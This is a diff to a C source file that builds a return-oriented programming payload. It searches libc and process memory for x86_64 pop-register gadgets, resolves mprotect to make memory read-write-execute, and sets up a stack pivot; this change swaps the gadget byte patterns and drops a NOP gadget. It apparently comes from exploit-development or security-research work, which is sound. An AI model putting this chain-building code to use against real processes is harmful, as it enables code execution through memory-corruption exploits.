@@ -15,10 +15,9 @@ void initload(PayloadPtr plp) {
 
 ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 	// Gadgets as strings (x86_64)
-	char s_popRDI[]	= {0x5f, 0xc3, 0};
-	char s_popRSI[]	= {0x5e, 0xc3, 0};
-	char s_popRDX[]	= {0x5a, 0xc3, 0};
-	char s_nopNOP[]	= {0x90, 0x90, 0xc3, 0};
+	char s_popRDI[]	= {0x90, 0x5f, 0xc3, 0};
+	char s_popRSI[]	= {0x90, 0x5e, 0xc3, 0};
+	char s_popRDX[]	= {0x90, 0x5a, 0xc3, 0};
 
 	// First try to find gadgets in libc
 	Pointer	libc_popRDI = searchRegion(bap->regions + rt_libc, s_popRDI);
@@ -29,19 +28,16 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 	Pointer	fbg_popRDI = searchRegion(bap->regions + rt_basehook, s_popRDI);
 	Pointer	fbg_popRSI = searchRegion(bap->regions + rt_basehook, s_popRSI);
 	Pointer	fbg_popRDX = searchRegion(bap->regions + rt_basehook, s_popRDX);
-	Pointer	fbg_nopNOP = searchRegion(bap->regions + rt_basehook, s_nopNOP);
 
 	// Next, get backup gadgets from fallbackGadgets()
 	Pointer	any_popRDI = searchMemory(s_popRDI);
 	Pointer	any_popRSI = searchMemory(s_popRSI);
 	Pointer	any_popRDX = searchMemory(s_popRDX);
-	Pointer	any_nopNOP = searchMemory(s_nopNOP);
 
 	// Things are wrong if I don't find the gadgets somewhere!
 	assert(any_popRDI != NULL);
 	assert(any_popRSI != NULL);
 	assert(any_popRDX != NULL);
-	assert(any_nopNOP != NULL); // This little guy is only found in fallbackGadgets()
 
 	// We will need "mprotect()"
 	Pointer	libc_mprotect = dlsym(RTLD_NEXT, "mprotect");
@@ -87,11 +83,6 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 		rcp->rc_popRDX.o = pointerToOffset(any_popRDX,  'A', bap);
 		
 	rcp->rc_permission  = 0x7;
-
-	if (fbg_nopNOP)
-		rcp->rc_nop.o = pointerToOffset(fbg_nopNOP,     'F', bap);
-	else
-		rcp->rc_nop.o = pointerToOffset(any_nopNOP,     'A', bap);
 
 	rcp->rc_mprotect.o  = pointerToOffset(libc_mprotect,	'L', bap);
 
@@ -154,7 +145,6 @@ void dumpload(PayloadPtr plp, BaseAddressesPtr bap, char *title) {
 	fprintf(stderr, fmt, "rc_stackSize",    rcp->rc_stackSize,   p8(&rcp->rc_stackSize,  d));
 	fprintf(stderr, fmt, "rc_popRDX.p",     rcp->rc_popRDX.p,    p8(&rcp->rc_popRDX,     d));
 	fprintf(stderr, fmt, "rc_permission",   rcp->rc_permission,  p8(&rcp->rc_permission, d));
-	fprintf(stderr, fmt, "rc_noop.p",       rcp->rc_nop.p,       p8(&rcp->rc_nop,        d));
 	fprintf(stderr, fmt, "rc_mprotect.p",   rcp->rc_mprotect.p,  p8(&rcp->rc_mprotect,   d));
 	fprintf(stderr, "\n");
 	fprintf(stderr, fmt, "rc_pivot.p",      rcp->rc_pivot.p,     p8(&rcp->rc_pivot,      d));
